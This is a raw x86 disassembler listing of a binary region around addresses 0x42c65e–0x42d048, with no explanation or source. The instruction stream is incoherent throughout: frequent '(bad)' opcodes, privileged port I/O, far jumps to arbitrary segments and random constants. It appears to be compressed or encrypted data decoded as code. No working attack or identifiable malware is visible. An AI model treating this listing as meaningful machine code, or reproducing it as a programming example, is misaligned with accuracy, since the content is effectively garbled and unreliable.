  42c65e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c65f:	ins    DWORD PTR es:[edi],dx
  42c660:	mov    WORD PTR [ecx-0x79],?
  42c663:	pusha  
  42c664:	neg    bh
  42c666:	imul   ebp,esi,0x22398bfb
  42c66c:	loop   0x42c6a6
	...
  42c6d6:	pop    ebp
  42c6d7:	dec    eax
  42c6d8:	jle    0x42c668
  42c6da:	jg     0x42c69a
  42c6dc:	std    
  42c6dd:	fstp   TBYTE PTR [ebx+0x186dfc6b]
  42c6e3:	and    ch,cl
  42c6e5:	stc    
  42c6e6:	fadd   QWORD PTR [bx+di]
  42c6e9:	add    BYTE PTR [eax],al
  42c6eb:	add    DWORD PTR [eax],eax
  42c6ed:	add    BYTE PTR [ebp+edx*1-0x3223d862],ch
  42c6f4:	popa   
  42c6f5:	add    ebx,DWORD PTR [edx+0x5aae3df6]
  42c6fb:	mov    ds:0x1e97c4ed,al
  42c700:	or     ch,BYTE PTR ds:0xe101b979
  42c706:	lock repnz ins BYTE PTR es:[edi],dx
  42c709:	cmc    
  42c70a:	sub    eax,eax
  42c70c:	lods   eax,DWORD PTR ds:[esi]
  42c70d:	xor    eax,0xc73965af
  42c712:	cmc    
  42c713:	lods   al,BYTE PTR ds:[esi]
  42c714:	pop    esi
  42c715:	fisubr WORD PTR [edx-0x1e59d86b]
  42c71b:	push   esi
  42c71c:	dec    esi
  42c71d:	push   0x618e436b
  42c722:	int3   
  42c723:	(bad)  
  42c724:	cmp    DWORD PTR [esi+edx*4],ecx
  42c727:	in     eax,dx
  42c728:	xchg   ecx,eax
  42c729:	cmp    BYTE PTR ds:0x1a5cc2e5,0xad
  42c730:	cmc    
  42c731:	xchg   ebp,eax
  42c732:	shl    DWORD PTR [esi-0x3a751544],1
  42c738:	(bad)  
  42c739:	pop    ss
  42c73a:	loop   0x42c757
  42c73c:	call   0x5c87:0xa2cf4fa8
  42c743:	mov    ebp,0xfab840b4
  42c748:	or     eax,0xcd5a0dfb
  42c74d:	sbb    al,0xa1
  42c74f:	mov    dl,0x71
  42c751:	in     eax,0xbd
  42c753:	ror    BYTE PTR ds:0x98f17bf1,0xce
  42c75a:	(bad)  
  42c75b:	sahf   
  42c75c:	aad    0xc4
  42c75e:	es dec ebx
  42c760:	xor    eax,0x8c79c66
  42c765:	dec    ebx
  42c766:	nop
  42c767:	adc    eax,DWORD PTR [edx-0x3e]
  42c76a:	cmc    
  42c76b:	push   ebx
  42c76c:	cmp    DWORD PTR ds:0xc585d9bf,esp
  42c772:	hlt    
  42c773:	(bad)  
  42c774:	jge    0x42c7ab
  42c776:	sti    
  42c777:	aaa    
  42c778:	std    
  42c779:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c77a:	push   es
  42c77b:	xor    BYTE PTR [ebp+0x60],bh
  42c77e:	jle    0x42c71a
  42c780:	xchg   ecx,eax
  42c781:	cmp    dl,BYTE PTR ds:0xcbbe9f68
  42c787:	sub    DWORD PTR [ebx-0x659a1200],edi
  42c78d:	rol    DWORD PTR [edi],1
  42c78f:	push   ebx
  42c790:	daa    
  42c791:	sar    DWORD PTR [ecx-0x219f7000],0x3a
  42c798:	pop    esp
  42c799:	dec    ecx
  42c79a:	dec    ebx
  42c79b:	sbb    DWORD PTR [ebx+0x60],esp
  42c79e:	inc    edx
  42c79f:	xchg   edx,eax
  42c7a0:	jmp    0xe2a50447
  42c7a5:	lods   eax,DWORD PTR ds:[esi]
  42c7a6:	add    ecx,DWORD PTR [ebx+0xc470400]
  42c7ac:	call   0x58f9:0xe522092d
  42c7b3:	xchg   BYTE PTR [edx+0x51fd74c8],bl
  42c7b9:	test   eax,0x144c9afc
  42c7be:	fimul  WORD PTR [di-0x1c]
  42c7c2:	sub    ch,BYTE PTR [ebx-0x3d786620]
  42c7c8:	pop    ebp
  42c7c9:	dec    edi
  42c7ca:	out    0x13,al
  42c7cc:	in     al,0x15
  42c7ce:	cmp    dl,dh
  42c7d0:	dec    edi
  42c7d1:	stos   BYTE PTR es:[edi],al
  42c7d2:	adc    eax,0xd9f91087
  42c7d7:	adc    eax,0x930da422
  42c7dc:	inc    ebx
  42c7dd:	xchg   edx,eax
  42c7de:	test   DWORD PTR [edx-0x1c25ab4],0x3150031a
  42c7e8:	fnstsw WORD PTR [eax-0x7b8a6f35]
	...
  42c856:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c85c:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c862:	gs addr16 fs loope 0x42c8ce
  42c867:	fld    QWORD PTR [ecx]
  42c869:	add    BYTE PTR [eax],al
  42c86b:	add    DWORD PTR [eax],eax
  42c86d:	add    BYTE PTR [eax],bl
  42c86f:	xor    eax,ecx
  42c871:	inc    esp
  42c872:	mov    esi,0x13b922e1
  42c877:	ror    DWORD PTR [esi-0x2a7704e8],1
  42c87d:	dec    esi
  42c87e:	out    0x3c,al
  42c880:	lea    esp,[ecx-0x7fbdfff6]
  42c886:	xor    al,0x74
  42c888:	mov    cl,0x73
  42c88a:	(bad)  
  42c88b:	mov    ebp,0x6e37e8f3
  42c890:	pop    eax
  42c891:	sub    dh,BYTE PTR [eax+edi*8]
  42c894:	xchg   edi,eax
  42c896:	cli    
  42c897:	jb     0x42c84d
  42c899:	sub    al,0x1e
  42c89b:	fild   DWORD PTR [edi-0x23]
  42c89e:	or     eax,0xdd96046
  42c8a3:	xchg   ebp,eax
  42c8a4:	adc    al,0xd7
  42c8a6:	ror    BYTE PTR [ecx-0x746e7a44],cl
  42c8ac:	loope  0x42c898
  42c8ae:	mov    ebp,0x95148a73
  42c8b3:	fldcw  WORD PTR [ecx+0x2a]
  42c8b6:	xchg   ebx,eax
  42c8b7:	sbb    al,0x57
  42c8b9:	enter  0xcc01,0x75
  42c8bd:	cmp    edx,DWORD PTR [ecx+0x76]
  42c8c0:	adc    ebp,ebx
  42c8c2:	push   esi
  42c8c3:	cmp    eax,0x2694d8e7
  42c8c8:	pop    ecx
  42c8c9:	xchg   ebp,eax
  42c8ca:	pop    es
  42c8cb:	push   eax
  42c8cc:	pop    es
  42c8cd:	mov    ebp,0xd14664c
  42c8d2:	dec    esp
  42c8d3:	(bad)  
  42c8d5:	sbb    eax,0xae519a7c
  42c8da:	push   edi
  42c8db:	fldcw  WORD PTR ds:0x5ba90c19
  42c8e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c8e2:	sub    bl,ah
  42c8e4:	xchg   DWORD PTR [ecx-0x7bc10a13],esp
  42c8ea:	sub    ebp,DWORD PTR [esi+0x380003b]
  42c8f0:	lock out 0x2f,al
  42c8f3:	jmp    0x42c959
  42c8f5:	enter  0x3a84,0xb7
  42c8f9:	jmp    0x59ef:0xf933c61b
  42c900:	xchg   esi,eax
  42c901:	pop    ss
  42c902:	cmp    DWORD PTR [esi],ebx
  42c904:	or     eax,0x4c43706d
  42c909:	(bad)  
  42c90a:	scas   al,BYTE PTR es:[edi]
  42c90b:	push   esp
  42c90c:	adc    BYTE PTR [esi-0x3d],cl
  42c90f:	test   al,0xbd
  42c911:	push   ebx
  42c912:	(bad)  
  42c914:	pop    es
  42c915:	adc    ebx,eax
  42c917:	test   BYTE PTR [eax],ch
  42c919:	or     ch,BYTE PTR [ecx+0x6]
  42c91c:	test   BYTE PTR [edx+0x3e],ah
  42c91f:	lods   al,BYTE PTR ds:[esi]
  42c920:	sub    BYTE PTR [edx+ebp*1],0x92
  42c924:	jg     0x42c8f3
  42c926:	jne    0x42c973
  42c928:	ins    DWORD PTR es:[edi],dx
  42c929:	ja     0x42c8e2
  42c92b:	mov    dl,0xf6
  42c92d:	mov    al,BYTE PTR [eax-0x36]
  42c930:	pop    ds
  42c931:	dec    ebx
  42c933:	mov    bl,0xb2
  42c935:	or     cl,bh
  42c937:	pusha  
  42c938:	mov    BYTE PTR [ebp-0x569c0067],ch
  42c93e:	les    ecx,FWORD PTR ds:0xf22ebdfa
  42c944:	pop    esp
  42c945:	mov    ch,0xfb
  42c947:	cmp    esi,eax
  42c949:	jmp    FWORD PTR [edi-0x66c87ed0]
  42c94f:	push   ds
  42c950:	xchg   edx,eax
  42c951:	jl     0x42c972
  42c953:	daa    
  42c954:	fsubr  QWORD PTR [edi-0x27]
  42c957:	sbb    eax,0xe0cb6c7c
  42c95c:	in     al,dx
  42c95d:	enter  0xc0f2,0xec
  42c961:	add    al,0x65
  42c963:	sbb    bl,BYTE PTR [eax+0x8fa252e]
  42c969:	push   esi
  42c96a:	push   0x95d320
	...
  42c9d3:	add    BYTE PTR [eax],al
  42c9d5:	add    BYTE PTR [eax],dl
  42c9d7:	sbb    ecx,ecx
  42c9d9:	jmp    0xfb73c5a9
  42c9de:	(bad)  
  42c9df:	scas   eax,DWORD PTR es:[edi]
  42c9e0:	inc    edi
  42c9e1:	call   0x1b7d5719
  42c9e6:	fiadd  WORD PTR [bx+di]
  42c9e9:	add    BYTE PTR [eax],al
  42c9eb:	add    DWORD PTR [eax],eax
  42c9ed:	add    BYTE PTR [esp+edx*8],ah
  42c9f0:	xchg   esp,eax
  42c9f1:	push   ebx
  42c9f2:	int    0x50
  42c9f4:	pop    ecx
  42c9f5:	scas   eax,DWORD PTR es:[edi]
  42c9f6:	dec    edi
  42c9f7:	enter  0x55a8,0x71
  42c9fb:	hlt    
  42c9fc:	stos   BYTE PTR es:[edi],al
  42c9fd:	(bad)  
  42c9ff:	repnz cmp BYTE PTR gs:[edi+0xaac83f8],cl
  42ca07:	push   es
  42ca08:	rep stos DWORD PTR es:[edi],eax
  42ca0a:	or     al,0x5b
  42ca0c:	mov    eax,0x942e67d2
  42ca11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca12:	jp     0x42c9fd
  42ca14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca15:	mov    ebp,0x92300bc9
  42ca1a:	rcl    DWORD PTR [ebx],cl
  42ca1c:	pusha  
  42ca1d:	shr    esp,0x34
  42ca20:	mov    dh,0x6a
  42ca22:	clc    
  42ca23:	fist   DWORD PTR [esi+0x5b]
  42ca26:	dec    ecx
  42ca27:	lods   eax,DWORD PTR ds:[esi]
  42ca28:	ins    DWORD PTR es:[edi],dx
  42ca29:	rcr    bl,1
  42ca2b:	push   eax
  42ca2c:	mov    ebx,0xfd238d8
  42ca31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca32:	das    
  42ca33:	sbb    ecx,DWORD PTR ds:0xfee0943c
  42ca39:	pop    eax
  42ca3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca3b:	(bad)  
  42ca3c:	fdiv   DWORD PTR [ecx+0x61810d90]
  42ca42:	pop    esp
  42ca43:	xchg   DWORD PTR [esi-0x78],ebp
  42ca46:	test   al,0x2e
  42ca48:	pushf  
  42ca49:	sbb    al,BYTE PTR [ecx-0x283873f5]
  42ca4f:	fadd   QWORD PTR [eax]
  42ca51:	jecxz  0x42ca73
  42ca53:	and    bl,dh
  42ca55:	ror    DWORD PTR [esi+0x9],0xab
  42ca59:	cmp    ch,BYTE PTR [ebx]
  42ca5b:	cmp    DWORD PTR [esi+0x4c3142b4],edi
  42ca61:	push   esi
  42ca62:	xchg   esp,eax
  42ca63:	and    eax,0xd76c830b
  42ca68:	adc    ch,BYTE PTR [eax+0x3980044d]
  42ca6e:	lea    ecx,[eax+0x7f5509fd]
  42ca74:	rcl    ah,0x74
  42ca77:	fwait
  42ca78:	pop    ebx
  42ca79:	(bad)  [edx+0x28b81e1a]
  42ca7f:	(bad)  
  42ca80:	fbstp  TBYTE PTR [edx-0x6188da28]
  42ca86:	jle    0x42ca47
  42ca88:	test   eax,0x3a1901d0
  42ca8d:	inc    ebp
  42ca8e:	cmp    BYTE PTR [edx],ah
  42ca90:	xor    al,BYTE PTR [edx]
  42ca92:	or     eax,0x7c17725e
  42ca97:	cmp    eax,esi
  42ca99:	popf   
  42ca9a:	cmp    esp,0x48aefb96
  42caa0:	shl    ebx,1
  42caa2:	xor    edi,esi
  42caa4:	pusha  
  42caa5:	ins    BYTE PTR es:[edi],dx
  42caa6:	pop    ds
  42caa7:	mov    edi,0xe657dbc5
  42caac:	jge    0x42ca67
  42caae:	cmc    
  42caaf:	jo     0x42cb21
  42cab1:	in     eax,0xe2
  42cab3:	or     dl,BYTE PTR [ecx-0x37]
  42cab6:	adc    eax,0x3497a47d
  42cabb:	leave  
  42cabc:	shr    DWORD PTR [ebx+0x28],cl
  42cabf:	and    al,bh
  42cac1:	iret   
  42cac2:	mov    esi,eax
  42cac4:	lds    ebp,FWORD PTR [edi+0x5fdd83a1]
  42caca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cacb:	sub    al,0x64
  42cacd:	pusha  
  42cace:	sbb    BYTE PTR [ecx+0x2847354f],bl
  42cad4:	jns    0x42cafc
  42cad6:	out    dx,eax
  42cad7:	push   ss
  42cad8:	inc    edx
  42cad9:	ins    DWORD PTR es:[edi],dx
  42cada:	lock dec eax
  42cadc:	mov    al,ds:0xe6710f97
  42cae1:	jp     0x42cad2
  42cae3:	or     DWORD PTR [esp+esi*1],eax
  42cae6:	nop
  42cae7:	scas   al,BYTE PTR es:[edi]
  42cae8:	nop
  42cae9:	and    al,BYTE PTR [eax+0x6faccf]
	...
  42cb53:	add    BYTE PTR [eax],al
  42cb55:	add    BYTE PTR [edi-0x2be7726],ah
  42cb5b:	push   ebx
  42cb5c:	out    dx,eax
  42cb5d:	(bad)  
  42cb5e:	fadd   QWORD PTR [ebp-0x2eb39140]
  42cb64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cb66:	fild   WORD PTR [bx+di]
  42cb69:	add    BYTE PTR [eax],al
  42cb6b:	add    DWORD PTR [eax],eax
  42cb6d:	add    BYTE PTR [esi+0x44],al
  42cb70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cb71:	cmp    ebx,DWORD PTR [ecx]
  42cb73:	(bad)  
  42cb74:	jp     0x42cafa
  42cb76:	(bad)  
  42cb77:	mov    bl,0x6c
  42cb79:	jmp    0x53a12cbd
  42cb7e:	mov    ah,0x7c
  42cb80:	lods   eax,DWORD PTR ds:[esi]
  42cb81:	mov    eax,ds:0xc030e4d8
  42cb86:	inc    ebx
  42cb87:	ds or  ch,dl
  42cb8a:	inc    edx
  42cb8b:	lahf   
  42cb8c:	idiv   DWORD PTR [ebx-0x425a3c34]
  42cb92:	or     DWORD PTR [esi],0x220915cf
  42cb98:	bound  esp,QWORD PTR [edi+0xa]
  42cb9b:	inc    eax
  42cb9c:	dec    eax
  42cb9d:	and    DWORD PTR [ebp+0x5b],esp
  42cba0:	loop   0x42cb72
  42cba2:	fnstsw WORD PTR [edx+0x7f]
  42cba5:	mov    edi,0x3f63eac
  42cbaa:	mov    al,0xfd
  42cbac:	mov    ebx,0xd2552c10
  42cbb1:	sbb    edi,DWORD PTR [eax-0x606b4639]
  42cbb7:	push   edx
  42cbb9:	inc    ebx
  42cbba:	das    
  42cbbb:	call   0xa612:0x62d5676e
  42cbc2:	mov    edx,0x66b78b01
  42cbc7:	lds    edi,FWORD PTR [edi-0x78]
  42cbca:	mov    dl,0x26
  42cbcc:	cmp    ebp,DWORD PTR [esi+0x7ad5c2f8]
  42cbd2:	cmp    al,0xe0
  42cbd4:	call   0xbeee:0x1f743c9e
  42cbdb:	pop    ecx
  42cbdc:	jp     0x42cb79
  42cbde:	imul   BYTE PTR ds:[esi+ebp*8]
  42cbe2:	lods   al,BYTE PTR ds:[esi]
  42cbe3:	dec    BYTE PTR [ecx+0x1795406d]
  42cbe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cbea:	inc    ebp
  42cbeb:	mov    edi,0xf870a9c3
  42cbf0:	dec    edx
  42cbf1:	cmp    eax,ebx
  42cbf3:	int3   
  42cbf4:	int    0xaf
  42cbf6:	leave  
  42cbf7:	push   es
  42cbf8:	rol    DWORD PTR [esi-0x50],cl
  42cbfb:	enter  0xa616,0xc6
  42cbff:	mov    esi,0x51d52546
  42cc04:	idiv   ch
  42cc06:	sti    
  42cc07:	jne    0x42cc04
  42cc09:	push   ebp
  42cc0a:	jmp    0x42cbd6
  42cc0c:	out    0x81,al
  42cc0e:	xchg   ebp,eax
  42cc0f:	out    0xce,eax
  42cc11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cc12:	xchg   edx,eax
  42cc13:	cdq    
  42cc14:	xchg   ebx,eax
  42cc15:	dec    esp
  42cc16:	aam    0xdb
  42cc18:	mov    edx,0xc33643ce
  42cc1d:	bound  ebp,QWORD PTR [ebp-0x6a]
  42cc20:	test   al,0x34
  42cc22:	fidiv  DWORD PTR [ebp-0x4]
  42cc25:	ins    BYTE PTR es:[edi],dx
  42cc26:	outs   dx,DWORD PTR ds:[esi]
  42cc27:	fist   DWORD PTR [ebp-0x30]
  42cc2a:	push   edx
  42cc2b:	dec    ecx
  42cc2c:	and    BYTE PTR [esi-0x73],bl
  42cc2f:	sbb    DWORD PTR [ecx-0x1],ebp
  42cc32:	mov    dh,0xa6
  42cc34:	or     eax,0xd3e90cff
  42cc39:	inc    ecx
  42cc3a:	and    eax,DWORD PTR [ebx+0x70e1aa56]
  42cc40:	push   ss
  42cc41:	and    ecx,DWORD PTR [ecx-0x4c]
  42cc44:	ds int3 
  42cc46:	xor    eax,0xee633cba
  42cc4b:	sbb    edx,DWORD PTR [esi-0x292679e7]
  42cc51:	inc    ebx
  42cc52:	cmp    eax,0xaab20cc5
  42cc57:	cmp    dh,ch
  42cc59:	sub    esp,DWORD PTR [ebx+ebx*1]
  42cc5c:	outs   dx,DWORD PTR ds:[esi]
  42cc5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cc5e:	sub    eax,0xc3e3c586
  42cc63:	pusha  
  42cc64:	cmp    al,0xc8
  42cc66:	fadd   QWORD PTR [esi+0x45bcbc4]
  42cc6c:	push   0xb2
	...
  42ccd5:	add    BYTE PTR [edi+0x2],bh
  42ccd8:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42ccdc:	call   FWORD PTR [ebx]
  42ccde:	fisttp WORD PTR [ebp+0x1]
  42cce1:	or     eax,0x2cb9a91e
  42cce6:	addr16 loopne 0x42ccea
  42cce9:	add    BYTE PTR [eax],al
  42cceb:	add    DWORD PTR [eax],eax
  42cced:	add    BYTE PTR [ebx-0x43],cl
  42ccf0:	xchg   ebp,eax
  42ccf1:	xchg   edx,ecx
  42ccf3:	push   0xffffffa4
  42ccf5:	and    eax,0xed0c445e
  42ccfa:	sar    BYTE PTR [ebp-0x6b],1
  42ccfd:	out    0xd3,al
  42ccff:	lods   al,BYTE PTR ds:[esi]
  42cd00:	(bad)  
  42cd01:	mov    ecx,0xa61b95e1
  42cd06:	lods   eax,DWORD PTR ds:[esi]
  42cd07:	sbb    BYTE PTR [edi],cl
  42cd09:	inc    BYTE PTR [edi-0x2ae9e758]
  42cd0f:	test   al,0xe0
  42cd11:	and    ah,BYTE PTR [eax-0xb]
  42cd14:	nop
  42cd15:	into   
  42cd16:	les    ebp,FWORD PTR [eax+ebp*4+0x34]
  42cd1a:	loopne 0x42cd6b
  42cd1c:	sti    
  42cd1d:	xchg   ecx,eax
  42cd1e:	pop    ebp
  42cd1f:	test   al,bh
  42cd21:	mov    esp,0x3ecae3cf
  42cd26:	sar    DWORD PTR [ecx+0x70],1
  42cd29:	dec    esp
  42cd2a:	repnz fisttp DWORD PTR [esi-0x56]
  42cd2e:	in     eax,0x19
  42cd30:	mov    esp,0x8a1afe78
  42cd35:	pop    esi
  42cd36:	neg    DWORD PTR [edi+eiz*4+0x26751058]
  42cd3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd3e:	(bad)  
  42cd3f:	cld    
  42cd40:	jge    0x42cd2d
  42cd42:	add    eax,0xb66a24f7
  42cd47:	jae    0x42cd6f
  42cd49:	or     al,BYTE PTR [ebx-0x23c3a93f]
  42cd4f:	or     al,0xa6
  42cd51:	xchg   ch,ch
  42cd53:	inc    edx
  42cd54:	imul   esp,DWORD PTR [eax+0x0],0xffffff93
  42cd58:	lods   eax,DWORD PTR ds:[esi]
  42cd59:	jecxz  0x42cce7
  42cd5b:	stos   DWORD PTR es:[edi],eax
  42cd5c:	mov    cl,0xac
  42cd5e:	jp     0x42cdbd
  42cd60:	xchg   ecx,eax
  42cd61:	add    al,0x2
  42cd63:	add    cl,dh
  42cd65:	cmp    esi,ecx
  42cd67:	and    al,0x47
  42cd69:	out    0xc,eax
  42cd6b:	popa   
  42cd6c:	jg     0x42cd43
  42cd6e:	cmp    al,0x30
  42cd70:	pop    ebp
  42cd71:	jae    0x42cd8c
  42cd73:	adc    DWORD PTR [edx+0x2e],ebx
  42cd76:	add    bh,BYTE PTR [eax]
  42cd78:	push   es
  42cd79:	sbb    al,0xa
  42cd7b:	dec    edi
  42cd7c:	mov    ds:0x8505b19e,al
  42cd81:	lahf   
  42cd82:	mov    eax,ds:0xc7fffe8f
  42cd87:	cmp    ch,BYTE PTR [edi+eax*8]
  42cd8a:	pop    ecx
  42cd8b:	xor    eax,0xdce02813
  42cd90:	nop
  42cd91:	sbb    ebx,DWORD PTR [ebx+0x5f]
  42cd94:	add    esi,ecx
  42cd96:	es pop ss
  42cd98:	jle    0x42cdcf
  42cd9a:	iret   
  42cd9b:	in     eax,dx
  42cd9c:	mov    BYTE PTR [edi-0x3a],cl
  42cd9f:	sbb    dh,BYTE PTR [eax]
  42cda1:	(bad)  
  42cda2:	adc    al,0x6b
  42cda4:	sub    BYTE PTR [edx+0x2f],dl
  42cda7:	xchg   edi,eax
  42cda8:	or     eax,0xa698183c
  42cdad:	(bad)  
  42cdae:	in     al,dx
  42cdaf:	pop    eax
  42cdb0:	or     eax,0x5c3f74cc
  42cdb5:	mov    edx,0x6d879494
  42cdba:	mov    al,ds:0x492944e9
  42cdbf:	jl     0x42cd81
  42cdc1:	inc    ebp
  42cdc2:	xchg   esi,eax
  42cdc3:	pop    esp
  42cdc4:	add    BYTE PTR [ebp+0x57002809],dh
  42cdca:	fnstenv [edx+edx*1-0x3e]
  42cdce:	mov    ebx,0x5f69e001
  42cdd3:	jmp    FWORD PTR [ecx-0x55]
  42cdd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cdd7:	jecxz  0x42cdc3
  42cdd9:	push   eax
  42cdda:	jo     0x42cd8c
  42cddc:	fwait
  42cddd:	xlat   BYTE PTR ds:[ebx]
  42cdde:	inc    eax
  42cddf:	stc    
  42cde0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cde1:	sub    BYTE PTR [ecx],ch
  42cde3:	xchg   BYTE PTR [edx+0x3a],bl
  42cde6:	jge    0x42cd72
  42cde8:	ja     0x42ce36
  42cdea:	push   esi
  42cdeb:	push   eax
  42cdec:	imul   esp,DWORD PTR [ebx+0x0],0x0
	...
  42ce53:	add    BYTE PTR [eax],al
  42ce55:	add    BYTE PTR [ecx],bl
  42ce57:	mov    eax,ds:0xdffe87fe
  42ce5c:	jns    0x42ce1d
  42ce5e:	xchg   BYTE PTR [esi],dh
  42ce60:	xchg   esi,eax
  42ce61:	mov    ch,0xb6
  42ce63:	(bad)  
  42ce64:	in     eax,dx
  42ce65:	push   0x1e167
  42ce6a:	add    BYTE PTR [ecx],al
  42ce6c:	add    BYTE PTR [eax],al
  42ce6e:	scas   eax,DWORD PTR es:[edi]
  42ce6f:	arpl   WORD PTR [eax+0x29],bx
  42ce72:	fisub  DWORD PTR [esi]
  42ce74:	cli    
  42ce75:	mov    BYTE PTR [eax-0x449a68f2],dh
  42ce7b:	pop    edx
  42ce7c:	mov    ds:0xadbc2c13,eax
  42ce81:	sbb    BYTE PTR [ecx-0x3c45e79e],bl
  42ce87:	outs   dx,DWORD PTR ds:[esi]
  42ce88:	fs sbb eax,ebx
  42ce8b:	(bad)  
  42ce8c:	in     eax,0x26
  42ce8e:	int    0x9e
  42ce90:	xor    DWORD PTR ds:0xbca0bf16,edi
  42ce96:	into   
  42ce97:	xchg   ebx,eax
  42ce98:	sti    
  42ce99:	mov    BYTE PTR [edx+0x60],bl
  42ce9c:	leave  
  42ce9d:	xor    bh,BYTE PTR [ebp+0xf]
  42cea0:	repnz dec ecx
  42cea2:	mov    cl,0x8e
  42cea4:	add    ebp,esi
  42cea6:	mov    ds:0xb2d5432e,al
  42ceab:	jle    0x42cea1
  42cead:	popa   
  42ceae:	sub    BYTE PTR [ebx-0x3],0xb2
  42ceb2:	inc    ecx
  42ceb3:	test   DWORD PTR [eax],ecx
  42ceb5:	ja     0xca0f734b
  42cebb:	icebp  
  42cebc:	mov    cl,0x7f
  42cebe:	stc    
  42cebf:	adc    al,0x77
  42cec1:	lods   eax,DWORD PTR ds:[esi]
  42cec2:	jne    0x42ceaf
  42cec4:	and    eax,0x2938b33d
  42cec9:	add    al,0xef
  42cecb:	test   eax,0x2fe5843b
  42ced0:	loopne 0x42cebe
  42ced2:	pop    edx
  42ced3:	mov    edx,0x87d9cfd5
  42ced8:	cwde   
  42ced9:	jle    0x42cf14
  42cedb:	out    dx,al
  42cedc:	and    ch,BYTE PTR [eax]
  42cede:	add    DWORD PTR [ecx],ecx
  42cee0:	add    ebp,esp
  42cee2:	mov    edx,0xaf9f82ec
  42cee7:	push   edx
  42cee8:	push   ds
  42cee9:	or     DWORD PTR [eax+edi*1-0x1cfb99c3],0xffffffaa
  42cef1:	ins    BYTE PTR es:[edi],dx
  42cef2:	or     ecx,ecx
  42cef4:	(bad)  
  42cef6:	push   ecx
  42cef7:	fmul   QWORD PTR [edx]
  42cef9:	mov    ch,0x5c
  42cefb:	outs   dx,DWORD PTR ds:[esi]
  42cefc:	cmp    DWORD PTR [edi],edx
  42cefe:	sub    dh,ah
  42cf00:	mov    BYTE PTR [ebx+ebp*1],ah
  42cf03:	lods   eax,DWORD PTR ds:[esi]
  42cf04:	mov    bl,0xa2
  42cf06:	mov    edi,0x938e083e
  42cf0b:	adc    DWORD PTR [ecx],edi
  42cf0d:	into   
  42cf0e:	jg     0x42cf85
  42cf10:	fisubr WORD PTR [esi-0x19f74a6d]
  42cf16:	xor    eax,0x5acd3939
  42cf1b:	mov    al,0x40
  42cf1d:	adc    eax,0xe0c3409e
  42cf22:	and    ecx,DWORD PTR [eax+edi*4-0x22839312]
  42cf29:	sahf   
  42cf2a:	shr    BYTE PTR [esi-0x1a],cl
  42cf2d:	pop    esp
  42cf2e:	or     dl,BYTE PTR [edx+ebx*1]
  42cf31:	or     eax,0x5aedaaf8
  42cf36:	sub    al,0x61
  42cf38:	jmp    0x42cf34
  42cf3a:	pop    esp
  42cf3b:	mov    ecx,0x5ace0236
  42cf40:	sub    ebx,DWORD PTR [edi+0x7d]
  42cf43:	pop    ebx
  42cf44:	and    eax,0x4afe201
  42cf49:	gs cwde 
  42cf4b:	push   edx
  42cf4c:	mov    cl,0x8c
  42cf4e:	ins    BYTE PTR es:[edi],dx
  42cf4f:	stos   BYTE PTR es:[edi],al
  42cf50:	mov    dh,0xd2
  42cf52:	mov    ch,0x8d
  42cf54:	mov    WORD PTR [edx],?
  42cf56:	dec    eax
  42cf57:	sbb    DWORD PTR [ecx-0x14],ebp
  42cf5a:	jns    0x42cf97
  42cf5c:	or     DWORD PTR [esi],esp
  42cf5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cf5f:	dec    esp
  42cf60:	inc    edi
  42cf61:	cli    
  42cf62:	sub    eax,edx
  42cf64:	cmp    ch,BYTE PTR [ebx-0x3272e8ab]
  42cf6a:	inc    esp
  42cf6b:	xchg   edi,eax
  42cf6c:	pop    ebx
  42cf6d:	xchg   edi,eax
	...
  42cfd6:	jae    0x42d015
  42cfd8:	fadd   st,st(1)
  42cfda:	fsubrp st(5),st
  42cfdc:	jnp    0x42cf9d
  42cfde:	or     al,BYTE PTR [esi]
  42cfe0:	cld    
  42cfe1:	(bad)  
  42cfe2:	in     al,dx
  42cfe3:	mov    ebp,0xe26703a9
  42cfe8:	add    DWORD PTR [eax],eax
  42cfea:	add    BYTE PTR [ecx],al
  42cfec:	add    BYTE PTR [eax],al
  42cfee:	dec    edx
  42cfef:	fist   WORD PTR [ecx-0x26cba0a6]
  42cff5:	stc    
  42cff6:	jae    0x42d029
  42cff8:	cmp    eax,0x69613248
  42cffd:	cli    
  42cffe:	jae    0x42cfa0
  42d000:	jbe    0x42cfe0
  42d002:	mov    esi,0x4f74abef
  42d007:	mov    ebx,0xa542dfe4
  42d00c:	or     bh,al
  42d00e:	add    ch,bl
  42d010:	pusha  
  42d011:	push   cs
  42d012:	push   esp
  42d013:	test   eax,0x5b276faa
  42d018:	nop
  42d019:	clc    
  42d01a:	dec    eax
  42d01b:	lods   al,BYTE PTR ds:[esi]
  42d01c:	pop    ebp
  42d01d:	xchg   esp,eax
  42d01e:	xlat   BYTE PTR ds:[ebx]
  42d01f:	std    
  42d020:	push   ebp
  42d021:	add    bl,bh
  42d023:	xchg   esi,eax
  42d024:	cmp    BYTE PTR [ebx+0x2abcb157],0x1c
  42d02b:	mov    dh,0xf4
  42d02d:	xor    DWORD PTR [ebp+0x2937d805],edi
  42d033:	js     0x42cfd1
  42d035:	paddusb mm2,mm1
  42d038:	enter  0x4c4c,0xa9
  42d03c:	push   edx
  42d03d:	and    bl,BYTE PTR [edx]
  42d03f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d040:	std    
  42d041:	aas    
  42d042:	ds loope 0x42d06f
  42d045:	lahf   
  42d046:	add    al,BYTE PTR [esi]
  42d048:	cmp    esp,0x40
